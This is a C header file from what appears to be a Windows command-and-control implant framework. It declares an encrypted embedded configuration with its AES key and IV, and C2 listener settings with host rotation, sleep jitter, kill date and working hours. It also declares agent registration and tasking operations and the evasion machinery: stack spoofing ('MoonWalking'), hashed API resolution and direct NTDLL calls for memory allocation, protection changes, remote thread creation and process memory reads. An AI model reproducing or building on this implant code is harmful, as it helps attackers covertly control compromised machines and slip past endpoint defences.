#pragma once
#include "Common/Common.h"
#include "evasion/stackspoof/spoof.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
//config bytes
#define CONFIG_BYTES {0x96,0x12,0xae,0xf7,0xa9,0xa1,0x4b,0x0a,0xa8,0x7c,0xd8,0x29,0xbd,0x07,0xad,0x12,0xaa,0xe9,0x2b,0x16,0x59,0xc2,0x51,0x97,0x29,0x18,0x39,0x4b,0xfb,0xf0,0xc4,0xfb,0x8a,0x2b,0xca,0x57,0x81,0x21,0x28,0xbd,0xe4,0xb7,0x61,0x1e,0xec,0xe1,0xad,0x3b,0xd7,0x24,0x1f,0xc5,0x76,0xb0,0xf4,0x6d,0x9c,0xa7,0x00,0xfa,0x5d,0x28,0x8b,0x5d,0x45,0xba,0xb0,0x8e,0xef,0x9c,0x5b,0x38,0x6e,0x89,0xac,0xb0,0xe0,0x4f,0xb0,0xe5,0xe7,0x8d,0xed,0x71,0x67,0xd8,0x06,0x2b,0x7d,0xf5,0x6e,0xee,0x68,0x4a,0xe8,0x8d,0x73,0x7f,0x28,0xf2,0x25,0xbb,0x6f,0x91,0xb7,0x4c,0xf9,0x04,0x94,0xde,0xcd,0x12,0xd1,0x01,0x07,0xc7,0xcc,0x9c,0x6e,0x14,0x38,0x29,0x79,0x6b,0x5f,0xaa,0x59,0xb0,0x4a,0xc9,0x8a,0x25,0x29,0xa1,0x9d,0x21,0xf1,0xac,0x4f,0x9d,0xb6,0xd5,0x83,0xba,0xa0,0xed,0x91,0x7c,0xbb,0xaf,0x2b,0x62,0xcd,0x85,0xfd,0x59,0x0b,0xc5,0xe4,0xda,0x1b,0x70,0x15,0x6c,0xc0,0x6d,0xd3,0x99,0xb9,0x62,0xff,0x02,0x2a,0x55,0x8f,0x7a,0xfe,0x4a,0xd9,0xda,0x9c,0xab,0xa9,0x6f,0xf9,0xea,0xf7,0x58,0xd2,0x66,0x48,0xba,0xf7,0x32,0x2f,0x2e,0x20,0xb6,0xb7,0x8e,0x9b,0x92,0x3f,0xc9,0x5b,0x58,0xf7,0xef,0x99,0x48,0x00,0xe5,0x8b,0x34,0xfc,0x4c,0x7b,0x82,0x01,0xe8,0x95,0xec,0xb3,0x90,0xe6,0x8c,0x27,0xb6,0xf5,0x79,0xd7,0xd2,0x37,0x21,0x89,0x51,0x0b,0xa4,0xa0,0x81,0xdb,0x40,0x89,0xcc,0xd3,0xa5,0xa6,0x9e,0x83,0x16,0x08,0xc3,0xfb,0xf2,0xd2,0x7c,0x65,0xdd,0x37,0x18,0x1c,0x5a,0x03,0x9a,0xcb,0xc6,0xc0,0xbb,0x34,0x0f,0x34,0x88,0x0b,0x52,0x31,0x4f,0x84,0x18,0x1c,0x38,0xed,0x2f,0x60,0x10,0x97,0xa8,0xab,0x1e,0x14,0x38,0x3a,0x29,0xef,0xd2,0xe1,0x09,0x40,0xd8,0x2d,0x08,0x16,0x80,0xf5,0xfc,0xc2,0x7c,0xd3,0x54,0xef,0xeb,0xd6,0x88,0x0f,0xe8,0xac,0x56,0xcb,0x92,0x0c,0x1f,0x0a,0x5a,0x43,0x74,0x9d,0x23,0xb7,0x7c,0xf6,0x9f,0x85,0xb6,0xc6,0x5f,0x87,0x86,0x6d,0x1f,0x5a,0x51,0x60,0xf6,0x21,0xe0,0x59,0x61,0x9b,0x7c,0x58,0xe2,0x11,0xfa,0x34,0xb0,0xfd,0x02,0x2e,0x56,0xc0,0xeb,0x0c,0x23,0x75,0x58,0x15,0x20,0xb1,0x90,0x5b,0x7d,0x46,0x65,0xb3,0xd7,0x70,0x35,0x92,0x5f,0xa9,0x28,0x1f,0x5e,0xde,0xf6,0xc3,0xe9,0xd9,0x33,0x14,0x77,0xae,0x95,0x6e,0x54,0x65,0xae,0x3e,0x88,0x81,0xb7,0x41,0x9e,0x37,0x6e,0x0a,0x98,0x15,0xd8,0xea,0x2f,0x40,0x62,0x5a,0x93,0xa7,0x44,0x05,0x83,0xc2,0xa1,0x3d,0x95,0xb3,0x2f,0xd6,0x11,0xd2,0xc9,0x9e,0x20,0x19,0x00,0x64,0x31,0xda,0xad,0x59,0x39,0xc7,0x06,0xee,0x33,0x27,0x39,0x8f,0xdf,0xdb,0x65,0xf4,0x07,0x90,0x08,0xc6,0x82,0xcf,0xa5,0x3d,0x6b,0xda,0xca,0x79,0x20,0x08,0xfe,0x0b,0x5d,0x58,0xa0,0x8a,0x34,0x22,0x9f,0x2b,0x9a,0xb0,0x67,0x61,0xb3,0xc9,0x67,0xdc,0x0c,0x36,0xad,0x46,0x71,0xd7,0x01,0xc8,0x70,0xd6,0xc8,0x09,0x01,0xf8,0x90,0x30,0x6a,0xec,0xf5,0xb5,0x83,0x4e,0x86,0x28,0xc8,0x73,0x3f,0x6c,0x3d,0xbf,0x00,0xfa,0x13,0xd1,0x82,0x23,0x74,0xdb,0x37,0x6a,0xaa,0xd8,0x9a,0x21,0xda,0x90,0x03,0x2c,0x70,0x6a,0x04,0x75,0x69,0xac,0xc7,0x0f,0xbe,0x44,0x9f,0x22,0xe0,0x4b,0x11,0x5b,0xc9,0x44,0x79,0xfd,0xaa,0x1c,0x70,0x41,0x7b,0x08,0x4d,0x5c,0xa0,0x17,0x57,0x1c,0xef,0x25,0x15,0x50,0x0f,0x54,0x13,0xc5,0x28,0x92,0xdc,0x79,0x5f,0x45,0x73,0x61,0x3c,0x58,0xb0,0xc9,0x7c,0x2a,0xfa,0x7d,0x1d,0xa9,0x76,0xa7,0xa7,0x0b,0x73,0x9e,0x94,0x4b,0xfb,0xe1,0x97,0x55,0x1a,0x5c,0xa3,0x48,0x41,0x04,0x72,0x1e,0xe1,0xb6,0x7b,0x7a,0xde,0xc9,0x2e,0x31,0xad,0x25,0x49,0xaa,0xc1,0xa3,0xe1,0xf0,0x87,0x78,0x7c,0xf8,0xe9,0xe8,0x5e,0x5b,0x10,0x6e,0xf9,0x31,0x88,0x01,0xda,0xa4,0x4c,0xb1,0xef,0x71,0x43,0x4c,0x51,0xd5,0x32,0xe9,0x46,0xf3,0xad,0xaa,0x5b,0x84,0x6d,0x1f,0xcc,0x72,0x6a,0xcc,0x1c,0x71,0x44,0xc5,0x81,0xcb,0x1c,0xa6,0xb9,0xd4,0xad,0x12,0xfe,0xda,0xf8,0xe9,0x68,0xb4,0x02,0xfe,0x5a,0x93,0xb3,0x93,0xd9,0xf5,0xa2,0xf0,0x98,0xa6,0x0d,0x6a,0x1a,0x3f,0xe2,0xca,0x9b,0x9d,0x3b,0x5e,0x34,0xc6,0xbb,0x90,0xc0,0x0c,0x34,0x2a}
 #define CONFIG_KEY_BYTES {0xfd,0x58,0x09,0xf5,0x0f,0x9a,0x6b,0x89,0x28,0x9a,0xb0,0xfa,0x5c,0xff,0xf4,0x2d,0x3f,0xed,0x81,0x52,0xfa,0x0d,0xec,0x6d,0xdd,0x13,0x1f,0x1b,0x77,0x3e,0x75,0xcd}
 #define CONFIG_IV_BYTES {0xa6,0x4f,0x88,0x1f,0x2e,0xa8,0xfd,0x41,0xb4,0xd2,0x44,0x47,0xcb,0xf7,0x4f,0x9c}
 #define HASH_CONFIG_BYTES {0xfe,0x32,0x7c,0xf5,0x68,0x7d,0x4f,0xba,0xc1,0xfa,0xff,0xa1,0x68,0xa1,0xbd,0x8e,0xbe,0x5b,0xd5,0x06,0xe9,0xdb,0x51,0xc5,0x68,0x87,0x52,0x89,0x27,0x99,0xcd,0x57,0xfc,0x61,0x61,0x24,0x5b,0x77,0x46,0x90,0x3d,0x54,0x5b,0xd5,0x7f,0x19,0x39,0x18,0x8d,0xd8,0xc6,0xfe,0xb1,0xe1,0x5e,0x91,0x49,0x6a,0xb0,0xa9,0x8d,0x39,0xe4,0x17,0xc3,0x36,0x45,0xed,0xc1,0x44,0x92,0xc9,0xe9,0x4b,0xe9,0x54,0x6e,0x23,0x56,0xc8,0x9c,0x9b,0xe7,0x6c,0x1d,0x8d,0xaa,0x83,0xe9,0xe1,0x97,0x9b,0x6f,0xbc,0x83,0x76,0xa8,0xa6,0x2b,0x4f,0x05,0x6b,0xf7,0x30,0x16,0x24,0x1f,0x2d,0x50,0xa7,0xed,0x35,0x84,0xec,0xaa,0xab,0xb7,0x86,0x06,0xe2,0x60,0xd8,0xa6,0xd7,0xca,0x97,0x4b,0x53,0xa7,0x0a,0x75,0x8f,0xa3,0x44,0xb3,0x20,0xc9,0xc4,0x38,0x43,0xaa,0xc0,0x24,0x8d,0x32,0x6a,0x47,0xc0,0x3f,0xfa,0x96,0xe3,0x76,0x02,0x97,0xa3,0xa9,0x01,0xf7,0x94,0x43,0x57,0x54,0xd8,0x71,0xac,0x33,0x0e,0x02,0xbe,0xb6,0x13,0xc9,0xd6,0xf7,0x9b,0x0f,0xef,0xc2,0x4a,0x51,0x08,0xad,0xbe,0xb6,0x2c,0xc8,0xb3,0xc6,0xfa,0x19,0xcb,0xc1,0x27,0x89,0x7b,0x15,0x71,0xc0,0x77,0x7f,0xe9,0xec,0x7c,0xf6,0x23,0x35,0x4e,0x2a,0xe4,0x0e,0x53,0x3b,0x85,0x4c,0x03,0xa6,0xa6,0x40,0x9e,0xdd,0xd8,0x97,0xb6,0x36,0xda,0xa6,0xa9,0x1e,0xc8,0x1d,0xf7,0xcf,0x3a,0xe8,0x9a,0xe5,0x9c,0xa9,0x5e,0xe5,0x4e,0x70,0x23,0x28,0x57,0x55,0x83,0x74,0xe5,0x04,0x75,0xce,0xca,0xf3,0x72,0x5e,0xc5,0xb3,0x37,0x9c,0x4a,0xda,0xdb,0x47,0x51,0x60,0xf2,0x95,0x10,0x97,0x6d,0xfa,0x70,0x13,0xf0,0x95,0xcb,0x59,0x7b,0x92,0x89,0x7c,0x13,0x34,0x12,0x4d,0x27,0x8b,0x3f,0x5b,0x6e,0xf8,0x18,0x17,0x33,0xbb,0xa0,0x76,0x3e,0x0a,0x3c,0x59,0x10,0x59,0x35,0x58,0x51,0xde,0xd8,0x07,0x75,0x03,0xf8,0xff,0xd9,0xcb,0x89,0x8a,0xde,0x45,0xf1,0x9d,0xeb,0x89,0x33,0xdd,0x3e,0x88,0x82,0x2f,0xad,0x94,0xfb,0x3e,0xd8,0xd9,0x70,0x8d,0x06,0x63,0x6d,0xda,0x9b,0x77,0x6d,0xb3,0x73,0x63,0x79,0x00,0x76,0x35,0x9f,0x69,0x3b,0x18,0xe2,0x6c,0x8b,0xfd,0x03,0x1a,0x73,0xb7,0x20,0xd7,0x8b,0x25,0x42,0x75,0xcb,0x31,0x54,0x8a,0xee,0x44,0x61,0x3a,0xc4,0xe7,0xf2,0xdb,0x01,0x4a,0x2c,0x38,0xef,0x63,0x66,0xc0,0x68,0xd9,0xd7,0x7e,0x92,0x2f,0xdc,0x19,0x97,0xf4,0x33,0xb8,0xc7,0x1d,0x86,0xcc,0x5a,0x02,0x73,0x78,0x66,0x6f,0x8c,0x49,0x0a,0x19,0x14,0x3f,0xd2,0x4e,0x15,0xc6,0xc6,0xaf,0x86,0x00,0xe8,0x0b,0xea,0x30,0x16,0x5b,0x17,0xa6,0xd7,0x49,0x4c,0xc4,0x28,0xff,0xd2,0x3e,0xc9,0x6b,0xd5,0xe0,0xc1,0x43,0xbc,0xc8,0xf4,0x63,0xb0,0x8f,0xcb,0xb7,0x7b,0xab,0xd5,0xa2,0x78,0x18,0xf4,0x72,0xd4,0xd1,0x01,0xbe,0x8b,0xb6,0xe9,0xc3,0x03,0xed,0xea,0xfd,0x4f,0xc0,0xc1,0x68,0x91,0x00,0xc2,0xb1,0xbe,0x95,0x3c,0x5c,0x85,0xa4,0xe3,0xc5,0xd2,0xe8,0xa4,0x58,0x2c,0xf6,0x24,0x8a,0x27,0x31,0xed,0xc7,0x4f,0x6c,0x85,0xc0,0x44,0x3e,0x5b,0x0c,0xd8,0x06,0x71,0x5b,0xb3,0xc7,0xa6,0x5e,0x4b,0x69,0xe4,0xe8,0x25,0xa5,0x72,0xdf,0xf2,0x5b,0x20,0x28,0x74,0x43,0x09,0xf5,0xa5,0x1e,0x26,0xe4,0xfa,0x73,0x9a,0xd5,0xc9,0x79,0x56,0x14,0xa7,0x63,0x32,0xf8,0x23,0x38,0xb4,0x5a,0x31,0x8b,0xdc,0xef,0x29,0xee,0x2e,0xb0,0xc2,0x38,0x88,0x91,0x53,0x30,0xf3,0xb5,0x2b,0x52,0xea,0x46,0xd3,0x72,0xfd}
 #define HASH_KEY_BYTES {0x44,0x35,0x04,0x1b,0xe5,0x7f,0x92,0x73,0x3b,0xfd,0xbb,0xb7,0x20,0x68,0x1f,0x6c,0xd7,0x66,0xac,0x45,0x7e,0x32,0xc6,0x82,0x6e,0xb1,0xc8,0xe2,0x9c,0xe0,0x71,0x10}
 #define HASH_IV_BYTES {0xb5,0xeb,0x38,0x62,0xf5,0x79,0xb2,0x92,0x70,0xce,0x95,0xdf,0x65,0xdf,0x89,0xea}

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;

typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *pListenerConfig;

typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	pListenerConfig listenerConfig;
	BOOL JmpRbx;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;


typedef struct _Win32 {
	//enumeration apis
	//NTDLL APIS
	HMODULE hNtdll;
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;
	t_RtlCreateTimerQueue pRtlCreateTimerQueue;
	t_NtCreateEvent pNtCreateEvent;
	t_RtlCaptureContext pRtlCaptureContext;
	t_RtlCreateTimer pRtlCreateTimer;
	t_RtlRegisterWait pRtlRegisterWait;
	t_RtlDeleteTimerQueue pRtlDeleteTimerQueue;
	t_RtlCopyMappedMemory pRtlCopyMappedMemory;
	t_NtWaitForSingleObject pNtWaitForSingleObject;
	t_NtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject;
	t_NtContinue pNtContinue;
	t_NtSetEvent pNtSetEvent;
	t_NtSetContextThread pNtSetContextThread;
	t_NtDuplicateObject pNtDuplicateObject;
	t_LdrGetProcedureAddress pLdrGetProcedureAddress;
	t_NtQueryVirtualMemory pNtQueryVirtualMemory;
	UINT64 RtlUserThreadStartHash;
	t_NtOpenThread pNtOpenThread;
	t_NtAllocateVirtualMemory pNtAllocateVirtualMemory;
	t_NtProtectVirtualMemory pNtProtectVirtualMemory;
	t_NtCreateThreadEx pNtCreateThreadEx;
	t_NtSetInformationVirtualMemory pNtSetInformationVirtualMemory;
	t_NtQueryInformationProcess pNtQueryInformationProcess;
	t_NtOpenProcess pNtOpenProcess;
	t_NtReadVirtualMemory pNtReadVirtualMemory;

	//KERNEL32 APIS
	HMODULE hKernel32;
	t_GetComputerNameExA pGetComputerNameExA;
	t_LocalAlloc pLocalAlloc;
	t_LocalReAlloc pLocalReAlloc;
	t_LocalFree pLocalFree;
	t_GetSystemTimeAsFileTime pGetSystemTimeAsFileTime;
	t_GetLocalTime pGetLocalTime;
	t_LoadLibraryA pLoadLibraryA;
	t_GetProcAddress pGetProcAddress;
	t_VirtualProtect pVirtualProtect;
	t_WaitForSingleObjectEx pWaitForSingleObjectEx;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;
	t_SystemFunction032 pSystemFunction032;
	HMODULE hCryptSp;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;
	t_WinHttpReadData pWinHttpReadData;
	t_WinHttpCloseHandle pWinHttpCloseHandle;

	//Kernelbase APIS
	HMODULE hKernelBase;
	UINT64 BaseThreadInitThunkHash;

} Win32, * pWin32;

typedef struct _AgentCMD {
	UINT CommandID;
	UINT RequestID;
	BYTE* DATA;
} AgentCMD, * pAgentCMD;

typedef struct _MoonWalking {
	PVOID RetAddr;
	PVOID FunctionPointer;
	PArgs Arguments;
} MoonWalking, * pMoonWalking;

typedef struct _PEINFO {
	//ImageBase Address
	PVOID ModuleBaseAddr;

	//Image Size
	DWORD ImageSize;

	//Number of Sections
	DWORD NumSections;
} PEINFO, * pPEINFO;

typedef struct _Agent {

	//win32 apis
	pWin32 apis;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;

	//active threads
	BOOL ActiveThreads;

	pPEINFO PEInfo;

	//TEB struct.
	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* MetaDataPackage;
	struct _Package* packages;

	//moonwalking structure.
	pMoonWalking Walker;

}Agent, * pAgent;

extern pAgent agent;

typedef enum  {
	REGISTER_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
	NO_JOB,
	LIST_LOADED_MODULES,
} Agent_Operations;


INT init_agent(PVOID RetAddress);
INT RegisterAgent();
void AgentMain();
INT ParseConfig();
BOOL ParseHashConfig();
void AgentRoutine();
VOID CfgAddressAdd();
BOOL CfgQueryEnforced(VOID);